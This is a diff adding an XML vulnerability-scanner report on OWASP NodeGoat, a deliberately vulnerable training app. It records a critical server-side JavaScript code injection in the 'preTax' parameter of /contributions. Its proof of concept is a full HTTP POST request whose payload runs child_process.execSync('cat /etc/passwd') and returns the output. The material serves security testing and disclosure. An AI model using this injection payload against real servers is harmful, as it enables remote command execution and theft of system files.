@@ -1,0 +1,32 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Vulnerabilities>
+	<Vulnerability>
+		<ID>6507875/467621776</ID>
+		<Name>Code Injection in /contributions</Name>
+		<Date>2019-05-24 12:27:24</Date>
+		<Status>new</Status>
+		<Type>Code Injection</Type>
+		<CWE-ID>CWE-94</CWE-ID>
+		<CVE-ID></CVE-ID>
+		<CVSSv3>9.8 [CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H]</CVSSv3>
+		<Risk>CRITICAL</Risk>
+		<URL>http://owasp-nodegoat.com:4000/contributions</URL>
+		<Description><![CDATA[Server-side JavaScript code injection vulnerability exists due to insufficient filtration of user-supplied data passed via the "preTax" HTTP POST parameter to "http://owasp-nodegoat.com:4000/contributions" URL. A remote authenticated attacker (note, registration is open) can send a specially crafted HTTP POST request and execute arbitrary JavaScript code in the security context of the Node.js server. ]]></Description>
+		<PoC><![CDATA[POST http://owasp-nodegoat.com:4000/contributions HTTP/1.1
+Host: owasp-nodegoat.com:4000
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en,en-US;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://owasp-nodegoat.com:4000/contributions
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 90
+Connection: close
+Cookie: connect.sid=s%3ATVNY7sIvAefK3mQqKY55ouSIymVtOlNr.ab4Ev%2FCyiDZODrQZOQL1Ejq4AVo4Eii51cYfCCr1L1g
+Upgrade-Insecure-Requests: 1
+
+preTax=preTax%3D2%3B+var+asd+%3D+require%28%27child_process%27%29.execSync%28%27cat+%2Fetc%2Fpasswd%27%29%3B+res.write%28asd%29&roth=0&afterTax=0]]></PoC>
+		<Remediation><![CDATA[Develop, test and deploy corrections for the application’s source code to properly filter all user-supplied input processed by the application. 
+]]></Remediation>
+	</Vulnerability>
+</Vulnerabilities>
